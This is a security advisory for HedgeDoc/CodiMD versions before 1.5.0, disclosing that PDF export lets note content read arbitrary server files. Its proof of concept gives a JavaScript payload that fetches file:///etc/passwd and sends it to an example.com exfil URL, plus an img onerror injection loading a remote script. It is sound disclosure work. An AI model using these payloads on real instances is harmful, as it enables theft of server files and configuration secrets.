# PDF export allows arbitrary file reads

Critical

[davidmehren](/davidmehren)
published
GHSA-pxxg-px9v-6qf3
Apr 25, 2021

## Package

hedgedoc

## Affected versions

<1.5.0

## Patched versions

1.5.0

## Description

### Impact

An attacker is able to receive arbitrary files from the file system when exporting a note to PDF. Since the code injection has to take place as note content, there fore this exploit requires the attackers ability to modify a note.

This will affect all instances, which have pdf export enabled.

### Patches

Fixed in [c178947](https://github.com/hedgedoc/hedgedoc/commit/c1789474020a6d668d616464cb2da5e90e123f65)

Was fixed in 1.5.0

### Workarounds

Start the CodiMD/HedgeDoc instance with `CMD_ALLOW_PDF_EXPORT=false` or set `"allowPDFExport": false` in config.json.

### Proof of Concept

1. Deploy a malicious JavaScript file to a server. For demonstration

   purposes the script uses the domain `example.com`.

```
function reqListener () {
    var encoded = encodeURI(this.responseText);
    var b64 = btoa(this.responseText);
    var raw = this.responseText;
    document.write('<iframe
src="http://example.com/exfil?data='+b64+'"></iframe>');
}
var oReq = new XMLHttpRequest();
oReq.addEventListener("load", reqListener);
oReq.open("GET", "file:///etc/passwd");
oReq.send();
```

2. Create a new note in CodiMD/HedgeDoc, containing:

```
<img src="something_not_found" onerror="document.write('<script
src=http://example.com/path_to_malicious_script.js></script>')"/>
```

3. Use export PDF function.
4. Read the exfiltrated data in base64 from your server access log.

### Further analysis

This works because while PhantomJS doesn't actually render the `file:///`

references to the PDF file itself, it still uses them internally, and

exfiltration is possible, and easy through JavaScript rendering.

The impact is pretty bad, as the attacker is able to read the CodiMD/HedgeDoc

`config.json` file as well any other files on the filesystem. Even though

the suggested Docker deploy option doesn't have many interesting files

itself, the `config.json` still often contains sensitive information -

database credentials, and maybe OAuth secrets among other things.

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

Disable PDF export due to security issue

```
As a temporary fix, to keep you and your users save, this patch disables
the PDF export feature. Details of the attack along with a fix for
future versions of CodiMD will be released in future.

I hope you can live with this solution for this release because I'm
super short on time and the alternative would be to ship no fix at all.
This appears to be the better solution for this release.
